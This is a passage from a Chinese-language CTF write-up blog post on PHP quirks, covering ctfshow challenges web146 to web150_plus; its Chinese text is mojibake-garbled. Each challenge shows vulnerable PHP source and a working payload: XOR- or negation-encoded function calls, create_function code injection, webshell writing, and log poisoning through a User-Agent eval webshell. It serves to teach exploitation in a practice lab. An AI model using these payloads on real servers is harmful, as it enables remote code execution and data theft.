<h3 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class="line">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class="line">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        if(preg_match(&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;, $v3))&#123;</span><br><span class="line">                die(&#x27;get out hacker!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class="line">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†å†’å·ï¼Œæ— æ³•ä½¿ç”¨ä¸‰ç›®è¿ç®—ç¬¦ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨ç­‰å·å’Œä½è¿ç®—ç¬¦</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;return 1==phpinfo()||1;&quot;);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥æ‰§è¡Œphpinfo()</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v3===(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)||&amp;v2=1</span><br><span class="line"></span><br><span class="line">?v1=1&amp;v3=|(&#x27;%13%19%13%14%05%0d&#x27;|&#x27;%60%60%60%60%60%60&#x27;)(&#x27;%14%01%03%20%06%02&#x27;|&#x27;%60%60%60%20%60%28&#x27;)|&amp;v2=1</span><br><span class="line"></span><br><span class="line">?v1=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&amp;v2=1</span><br></pre></td></tr></table></figure>



<h3 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;ctf&#x27;]))&#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf&#x27;];</span><br><span class="line">    if(!preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$ctfshow)) &#123;</span><br><span class="line">        $ctfshow(&#x27;&#x27;,$_GET[&#x27;show&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸ä¼šï¼Œè¿˜æ˜¯è€è€å®å®çœ‹wpå§ã€‚</p>
<p>è€ƒå¯Ÿç‚¹ï¼šcreate_function()ä»£ç æ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">create_function(&#x27;$a&#x27;,&#x27;echo $a.&quot;123&quot;&#x27;)</span><br><span class="line"></span><br><span class="line">ç±»ä¼¼äº</span><br><span class="line"></span><br><span class="line">function f($a) &#123;</span><br><span class="line">  echo $a.&quot;123&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬ç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥ echo 1;}phpinfo();&#x2F;&#x2F;<br> å°±ç­‰ä»·äº</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function f($a) &#123;</span><br><span class="line">  echo 1;&#125;phpinfo();//</span><br><span class="line">&#125;</span><br><span class="line">ä»è€Œæ‰§è¡Œphpinfo()å‘½ä»¤</span><br><span class="line">fuzzåå‘ç°%5cå¯ä»¥ç»•è¿‡è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼</span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get: ?show=echo 123;&#125;system(&#x27;tac f*&#x27;);//</span><br><span class="line">post: ctf=%5ccreate_function</span><br></pre></td></tr></table></figure>



<h3 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">    $code=$_GET[&#x27;code&#x27;];</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_ctfshow_fl0g()&#123;</span><br><span class="line">    echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœªè¿‡æ»¤å¼‚æˆ–ï¼Œç›´æ¥æ„é€ </p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%02&quot;^&quot;%7d%60%60%21%60%28&quot;);</span><br></pre></td></tr></table></figure>



<h3 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$files = scandir(&#x27;./&#x27;); </span><br><span class="line">foreach($files as $file) &#123;</span><br><span class="line">    if(is_file($file))&#123;</span><br><span class="line">        if ($file !== &quot;index.php&quot;) &#123;</span><br><span class="line">            unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file_put_contents($_GET[&#x27;ctf&#x27;], $_POST[&#x27;show&#x27;]);</span><br><span class="line"></span><br><span class="line">$files = scandir(&#x27;./&#x27;); </span><br><span class="line">foreach($files as $file) &#123;</span><br><span class="line">    if(is_file($file))&#123;</span><br><span class="line">        if ($file !== &quot;index.php&quot;) &#123;</span><br><span class="line">            unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>éé¢„æœŸ</p>
<p>å¾€index.phpç›´æ¥å†™é©¬ï¼Œç„¶åèšå‰‘è¿æ¥å³å¯</p>
<p>é¢„æœŸè§£</p>
<p>æ–‡ä»¶ç«äº‰ï¼Œä¸€ä¸ªè´Ÿè´£ä¸€ç›´å†™æ–‡ä»¶ï¼Œä¸€ä¸ªè´Ÿè´£ä¸€ç›´è¯»æ–‡ä»¶</p>
<h3 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class CTFSHOW&#123;</span><br><span class="line">    private $username;</span><br><span class="line">    private $password;</span><br><span class="line">    private $vip;</span><br><span class="line">    private $secret;</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;vip = 0;</span><br><span class="line">        $this-&gt;secret = $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isVIP()&#123;</span><br><span class="line">        return $this-&gt;vip?TRUE:FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __autoload($class)&#123;</span><br><span class="line">        if(isset($class))&#123;</span><br><span class="line">            $class();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#è¿‡æ»¤å­—ç¬¦</span><br><span class="line">$key = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line">if(preg_match(&#x27;/\_| |\[|\]|\?/&#x27;, $key))&#123;</span><br><span class="line">    die(&quot;error&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$ctf = $_POST[&#x27;ctf&#x27;];</span><br><span class="line">extract($_GET);</span><br><span class="line">if(class_exists($__CTFSHOW__))&#123;</span><br><span class="line">    echo &quot;class is exists!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123;</span><br><span class="line">    include($ctf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ—¥å¿—ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /?isVIP=1 HTTP/1.1</span><br><span class="line">Host: 76d1b363-e52c-456b-aff5-8c0c5ad8c0ad.challenge.ctf.show</span><br><span class="line">User-Agent: &lt;?php eval($_POST[1]);?&gt;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: _ga=GA1.2.1418869291.1680592508</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 49</span><br><span class="line"></span><br><span class="line">ctf=/var/log/nginx/access.log&amp;1=system(&#x27;cat f*&#x27;);</span><br></pre></td></tr></table></figure>



<h3 id="web150-plus"><a href="#web150-plus" class="headerlink" title="web150_plus"></a>web150_plus</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class CTFSHOW&#123;</span><br><span class="line">    private $username;</span><br><span class="line">    private $password;</span><br><span class="line">    private $vip;</span><br><span class="line">    private $secret;</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;vip = 0;</span><br><span class="line">        $this-&gt;secret = $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isVIP()&#123;</span><br><span class="line">        return $this-&gt;vip?TRUE:FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __autoload($class)&#123;</span><br><span class="line">        if(isset($class))&#123;</span><br><span class="line">            $class();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#è¿‡æ»¤å­—ç¬¦</span><br><span class="line">$key = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line">if(preg_match(&#x27;/\_| |\[|\]|\?/&#x27;, $key))&#123;</span><br><span class="line">    die(&quot;error&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$ctf = $_POST[&#x27;ctf&#x27;];</span><br><span class="line">extract($_GET);</span><br><span class="line">if(class_exists($__CTFSHOW__))&#123;</span><br><span class="line">    echo &quot;class is exists!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE &amp;&amp; strrpos($ctf,&quot;log&quot;)===FALSE)&#123;</span><br><span class="line">    include($ctf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†logï¼Œä¸èƒ½æ—¥å¿—åŒ…å«ç»•è¿‡äº†</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¿™ä¸ªé¢˜ä¸€ç‚¹ç‚¹å°å‘__autoload()å‡½æ•°ä¸æ˜¯ç±»é‡Œé¢çš„</span><br><span class="line">__autoload â€” å°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</span><br><span class="line">æœ€åæ„é€ ?..CTFSHOW..=phpinfoå°±å¯ä»¥çœ‹åˆ°phpinfoä¿¡æ¯å•¦</span><br><span class="line">åŸå› æ˜¯..CTFSHOW..è§£æå˜é‡æˆ__CTFSHOW__ç„¶åè¿›è¡Œäº†å˜é‡è¦†ç›–ï¼Œå› ä¸ºCTFSHOWæ˜¯ç±»å°±ä¼šä½¿ç”¨</span><br><span class="line">__autoload()å‡½æ•°æ–¹æ³•ï¼Œå»åŠ è½½ï¼Œå› ä¸ºç­‰äºphpinfoå°±ä¼šå»åŠ è½½phpinfo</span><br><span class="line">æ¥ä¸‹æ¥å°±å»getshellå•¦</span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?..CTFSHOW..=phpinfo</span><br></pre></td></tr></table></figure>

<p>phpå˜é‡ä¸èƒ½å«æœ‰ç‚¹ç©ºæ ¼ï¼Œé‡åˆ°è¿™äº›ä¼šè‡ªåŠ¨è½¬åŒ–ä¸ºä¸‹åˆ’çº¿</p>
<hr>
<p>æ€»ç®—æ˜¯å†™å®Œå•¦ï¼Œä¸è¿‡è¿™æ°¸è¿œä¸æ˜¯ç»ˆç‚¹â€¦</p>

                </div>
                
                        
<div class="post-copyright-info-container border-box">
    <div class="copyright-info-content border-box">
        <div class="copyright-info-top border-box">
            <div class="copyright-post-title border-box text-ellipsis">
                PHPç‰¹æ€§
            </div>

            <div class="copyright-post-link border-box text-ellipsis">
                2022/03/21/PHPç‰¹æ€§/
            </div>
        </div>

        <div class="copyright-info-bottom border-box">
            <div class="copyright-post-author bottom-item">
                <div class="type">
                    ä½œè€…
                </div>
                <div class="content">P1taya</div>
            </div>

            <div class="post-time bottom-item">
                <div class="type">
                    å‘å¸ƒäº
                </div>
                <div class="content">2022-03-21 21:23</div>
            </div>


            <div class="post-license bottom-item">
                <div class="type">
                    è®¸å¯
                </div>
                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
                        
                            <i class="fa-brands fa-creative-commons"></i>
                            <i class="fa-brands fa-creative-commons-by"></i>
                            <i class="fa-brands fa-creative-commons-nc"></i>
                            <i class="fa-brands fa-creative-commons-sa"></i>
                        
                    </a>
                </div>
            </div>
        </div>

        <i class="copyright-bg fa-solid fa-copyright"></i>
    </div>
    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="å¤åˆ¶ç‰ˆæƒä¿¡æ¯" data-tooltip-offset-y="-2px">
        <i class="fa-solid fa-copy"></i>
    </div>
</div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                    </div>
                    <div>
                        
                    </div>
                </div>

                

                
                    <div class="post-nav border-box">
                        
                            <div class="prev-post">
                                <a class="prev"
                                   rel="prev"
                                   href="/2022/05/17/SSRF%E5%88%9D%E6%8E%A2/"
                                   title="SSRFåˆæ¢"
                                >
                                    <span class="left arrow-icon flex-center">
                                        <i class="fas fa-chevron-left"></i>
                                    </span>
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">SSRFåˆæ¢</span>
                                        <span class="post-nav-item">ä¸Šä¸€ç¯‡</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="next-post">
                                <a class="next"
                                   rel="next"
                                   href="/2022/03/10/web%E6%BC%8F%E6%B4%9E%E5%A4%8D%E4%B9%A0/"
                                   title="webæ¼æ´å¤ä¹ "
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">webæ¼æ´å¤ä¹ </span>
                                        <span class="post-nav-item">ä¸‹ä¸€ç¯‡</span>
                                    </span>
                                    <span class="right arrow-icon flex-center">
                                        <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    






                
            </div>
        </div>

        
            <div class="pc-post-toc right-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E7%89%B9%E6%80%A7"><span class="nav-text">PHPç‰¹æ€§</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web89"><span class="nav-text">web89</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web90"><span class="nav-text">web90</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web91"><span class="nav-text">web91</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web92"><span class="nav-text">web92</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web93"><span class="nav-text">web93</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web94"><span class="nav-text">web94</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web95"><span class="nav-text">web95</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web96"><span class="nav-text">web96</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web97"><span class="nav-text">web97</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web98"><span class="nav-text">web98</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web99"><span class="nav-text">web99</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web100"><span class="nav-text">web100</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web101"><span class="nav-text">web101</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web102"><span class="nav-text">web102</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web103"><span class="nav-text">web103</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web104"><span class="nav-text">web104</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web105"><span class="nav-text">web105</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web106"><span class="nav-text">web106</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web107"><span class="nav-text">web107</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web108"><span class="nav-text">web108</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web109"><span class="nav-text">web109</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web110"><span class="nav-text">web110</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web111"><span class="nav-text">web111</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web112"><span class="nav-text">web112</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web113"><span class="nav-text">web113</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web114"><span class="nav-text">web114</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web115"><span class="nav-text">web115</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web123"><span class="nav-text">web123</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web125"><span class="nav-text">web125</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web126"><span class="nav-text">web126</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web127"><span class="nav-text">web127</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web128"><span class="nav-text">web128</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web129"><span class="nav-text">web129</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web130"><span class="nav-text">web130</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web131"><span class="nav-text">web131</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web132"><span class="nav-text">web132</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web133"><span class="nav-text">web133</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web134"><span class="nav-text">web134</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web135"><span class="nav-text">web135</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web136"><span class="nav-text">web136</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web137"><span class="nav-text">web137</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web138"><span class="nav-text">web138</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web139"><span class="nav-text">web139</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web140"><span class="nav-text">web140</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web141"><span class="nav-text">web141</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web142"><span class="nav-text">web142</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web143"><span class="nav-text">web143</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web144"><span class="nav-text">web144</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web155"><span class="nav-text">web155</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web146"><span class="nav-text">web146</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web147"><span class="nav-text">web147</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web148"><span class="nav-text">web148</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web149"><span class="nav-text">web149</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web150"><span class="nav-text">web150</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web150-plus"><span class="nav-text">web150_plus</span></a></li></ol></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="border-box website-info-box default">
        
            <div class="copyright-info info-item default">
                &copy;&nbsp;<span>2022</span>&nbsp;-&nbsp;2024
                
                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">P1taya</a>
                
            </div>

            <div class="theme-info info-item default">
                ç”±&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;é©±åŠ¨&nbsp;&&nbsp;ä¸»é¢˜&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
            </div>

            

            
        

        <div class="count-item info-item default">
            
                <span class="count-box border-box word">
                    <span class="item-type border-box">æ€»å­—æ•°</span>
                    <span class="item-value border-box word">79.9k</span>
                </span>
            

            
                <span class="count-box border-box uv">
                    <span class="item-type border-box">è®¿å®¢æ•°</span>
                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
                </span>
            

            
                <span class="count-box border-box pv">
                    <span class="item-type border-box">è®¿é—®é‡</span>
                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
                </span>
            
        </div>
    </div>
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="tools-list border-box">
        <!-- PC TOC show toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- PC go comment -->
        

        <!-- PC full screen -->
        <li class="tools-item flex-center full-screen">
            <i class="fa-solid fa-expand"></i>
        </li>
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-toggle-theme-mode flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        
            <li class="tools-item toggle-show-toc-tablet flex-center">
                <i class="fas fa-list"></i>
            </li>
        

        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    
